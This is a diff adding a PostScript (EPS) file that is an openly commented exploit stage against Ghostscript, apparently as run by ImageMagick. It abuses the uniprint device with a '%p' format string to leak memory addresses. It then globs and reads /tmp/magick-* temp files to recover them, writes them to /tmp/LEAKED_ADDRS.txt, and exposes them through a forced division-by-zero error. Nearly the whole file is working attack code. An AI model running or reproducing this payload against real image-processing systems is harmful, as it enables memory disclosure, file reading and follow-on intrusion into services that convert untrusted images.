@@ -1,0 +1,79 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+
+% STEP 1: Render with uniprint format string
+<< /OutputDevice /uniprint
+   /upColorModel /DeviceGray
+   /upWriteComponentCommands <<
+     /Prologue (ADDR_\045p_\045p_\045p_\045p_\045p_\045p_\045p_\045p_ENDADDR\n)
+   >>
+>> setpagedevice
+0 0 moveto 100 100 lineto stroke
+showpage
+
+% STEP 2: Back to pngalpha
+<< /OutputDevice /pngalpha >> setpagedevice
+
+% STEP 3: Find and read ALL magick temp files
+% Collect all filenames first
+/files 20 array def
+/nfiles 0 def
+(/tmp/magick-*) {
+  files nfiles 3 -1 roll put
+  /nfiles nfiles 1 add def
+  nfiles 20 ge {exit} if
+} 256 string filenameforall
+
+% Write file inventory to /tmp/ for debugging
+(/tmp/gs_file_inventory.txt) (w) file
+nfiles 0 gt {
+  nfiles {
+    /idx exch def
+    files idx get dup 3 index exch writestring
+    ( | ) 3 index exch writestring
+    % Try to read first 100 bytes to identify content
+    {
+      files idx get (r) file
+      100 string readstring pop
+      4 index exch writestring
+    } stopped { (CANT_READ) 4 index exch writestring } if
+    (\n) 3 index exch writestring
+  } for
+} if
+closefile
+
+% Now find the one with ADDR_ marker
+/found_addrs false def
+nfiles {
+  /idx exch def
+  {
+    files idx get (r) file
+    /fd exch def
+    4096 string
+    fd exch readstring pop
+    fd closefile
+    dup (ADDR_) search {
+      % FOUND! This is the uniprint output with leaked addresses
+      pop pop
+      % Extract until ENDADDR
+      (ENDADDR) search {
+        pop exch pop
+        % This string has the leaked addresses
+        /addr_string exch def
+        /found_addrs true def
+        (/tmp/LEAKED_ADDRS.txt) (w) file dup addr_string writestring closefile
+        addr_string 1 0 div
+      } { pop } ifelse
+    } { pop } ifelse
+  } stopped { pop } if
+  found_addrs {exit} if
+} for
+
+found_addrs not {
+  % Dump all file info for debugging
+  (/tmp/gs_file_inventory.txt) (r) file
+  4096 string readstring pop
+  1 0 div
+} if
+
+showpage
